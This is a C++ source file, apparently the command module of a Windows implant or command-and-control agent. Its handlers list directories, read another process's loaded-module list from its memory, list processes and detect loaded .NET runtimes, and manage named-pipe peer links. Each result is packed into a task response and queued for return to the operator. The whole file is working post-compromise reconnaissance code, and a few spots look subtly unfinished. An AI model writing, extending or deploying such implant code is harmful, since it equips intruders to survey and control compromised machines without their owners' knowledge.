#include <core/include/commands.hpp>
namespace Commands {

    VOID DirectoryList (_parser *const parser) {
        HEXANE

        _stream *out = Stream::CreateTaskResponse(DIRECTORYLIST);

        ULONG length    = { };
        LPSTR query     = { };
        LPSTR path      = { };

        HANDLE              file        = { };
        WIN32_FIND_DATAA    head        = { };
        ULARGE_INTEGER      file_size   = { };
        SYSTEMTIME          access_time = { };
        SYSTEMTIME          sys_time    = { };

        query   = Parser::UnpackString(parser, nullptr);
        path    = R_CAST(char*, x_malloc(MAX_PATH));

        if (query[0] == PERIOD) {
            x_assert(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path));

            if (path[length - 1] != BSLASH) {
                path[length++] = BSLASH;
            }
            path[length++]  = ASTER;
            path[length]    = NULTERM;

        } else {
            x_memcpy(path, query, MAX_PATH);
        }

        x_assert(file = Ctx->win32.FindFirstFileA(path, &head));

        do {
            x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
            x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));

            if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                Stream::PackDword(out, TRUE);

            } else {
                file_size.HighPart   = head.nFileSizeHigh;
                file_size.LowPart    = head.nFileSizeLow;

                Stream::PackDword(out, FALSE);
                Stream::PackDword64(out, file_size.QuadPart);
            }

            Stream::PackDword(out, access_time.wMonth);
            Stream::PackDword(out, access_time.wDay);
            Stream::PackDword(out, access_time.wYear);
            Stream::PackDword(out, sys_time.wHour);
            Stream::PackDword(out, sys_time.wMinute);
            Stream::PackDword(out, sys_time.wSecond);
            Stream::PackString(out, head.cFileName);
        } while (Ctx->win32.FindNextFileA(file, &head) != 0);

        Dispatcher::MessageQueue(out);

        defer:
        if (file) { Ctx->win32.FindClose(file); }
        if (path) { x_free(path); }
    }

    VOID ProcessModules (_parser *const parser) {
        HEXANE

        _stream *out = Stream::CreateTaskResponse(PROCESSMODULES);

        PPEB_LDR_DATA               loads   = { };
        HANDLE                      process = { };
        ULONG                       pid     = { };
        PROCESS_BASIC_INFORMATION   pbi     = { };

        PLIST_ENTRY                 head 	= { };
        PLIST_ENTRY                 entry   = { };
        LDR_DATA_TABLE_ENTRY        module  = { };

        CHAR    modname_a[MAX_PATH] = { };
        WCHAR   modname_w[MAX_PATH] = { };

        INT     count   = 0;
        SIZE_T  size    = 0;

        x_assert(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr)));
        x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));

        if (NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size));
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));

            head = &loads->InMemoryOrderModuleList;
            while (entry != head) {
                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));

                if (size != module.FullDllName.Length) {
                    goto defer;
                }

                if (module.FullDllName.Length > 0) {
                    size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);

                    Stream::PackString(out, modname_a);
                    Stream::PackDword64(out, R_CAST(UINT64, module.DllBase));
                    count++;
                }

                x_memset(modname_w, 0, MAX_PATH);
                x_memset(modname_a, 0, MAX_PATH);

                entry = module.InMemoryOrderLinks.Flink;
            }
        }

        Dispatcher::MessageQueue(out);
        defer:
    }

    VOID ProcessList(_parser *const parser) {
        HEXANE

        _stream *out = Stream::CreateTaskResponse(PROCESSLIST);

        PROCESSENTRY32  entries     = { };
        HANDLE          snapshot    = { };
        HANDLE          process     = { };

        IEnumUnknown    *enums      = { };
        ICLRMetaHost    *meta       = { };
        ICLRRuntimeInfo *runtime    = { };

        DWORD Type  = Parser::UnpackDword(parser); // listing managed/un-managed processes
        DWORD Size  = 0;

        WCHAR buffer[1024];

        Size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        x_assert(snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        x_assert(Ctx->win32.Process32First(snapshot, &entries));

        do {
            BOOL is_managed  = FALSE;
            BOOL is_loaded   = FALSE;

            CLIENT_ID           cid     = { };
            OBJECT_ATTRIBUTES   attr    = { };

            cid.UniqueThread    = nullptr;
            cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);

            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
            if (!NT_SUCCESS(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
                continue;
            }

            if (SUCCEEDED(Ctx->clr.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
                if (SUCCEEDED(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {

                    while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
                        if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
                            is_managed = TRUE;

                            if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
                                Stream::PackDword(out, entries.th32ProcessID);
                                Stream::PackString(out, entries.szExeFile);
                                Stream::PackWString(out, buffer);
                            }
                        }
                        runtime->lpVtbl->Release(runtime);
                    }
                }
            }

            if (!is_managed && Type == UNMANAGED_PROCESS) {
                Stream::PackDword(out, entries.th32ProcessID);
                Stream::PackString(out, entries.szExeFile);
            }

            if (meta)       { meta->lpVtbl->Release(meta); }
            if (runtime)    { runtime->lpVtbl->Release(runtime); }
            if (enums)      { enums->Release(); }

            Ctx->nt.NtClose(process);
        } while (Ctx->win32.Process32Next(snapshot, &entries));

        Dispatcher::MessageQueue(out);

        defer:
        if (snapshot) { Ctx->nt.NtClose(snapshot); }
    }

    VOID AddPeer(_parser *parser) {
        HEXANE

        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
        auto peer_id    = Parser::UnpackDword(parser);

        Clients::AddClient(pipe_name, peer_id);
    }

    VOID RemovePeer(_parser *parser) {
        HEXANE

        auto peer_id = Parser::UnpackDword(parser);
        Clients::RemoveClient(peer_id);
    }

    VOID Shutdown (_parser *parser) {
        HEXANE

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }


    UINT_PTR GetCommandAddress(const uint32_t name, bool* internal) {
        HEXANE

        uintptr_t address = { };
        *internal = false;

        for (uint32_t i = 0 ;; i++) {
            if (!Commands::cmd_map[i].name) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (Commands::cmd_map[i].name == name) {
                *internal = true;
                address = U_PTR(Commands::cmd_map[i].address);
            }
        }

        defer:
        return address;
    }

}
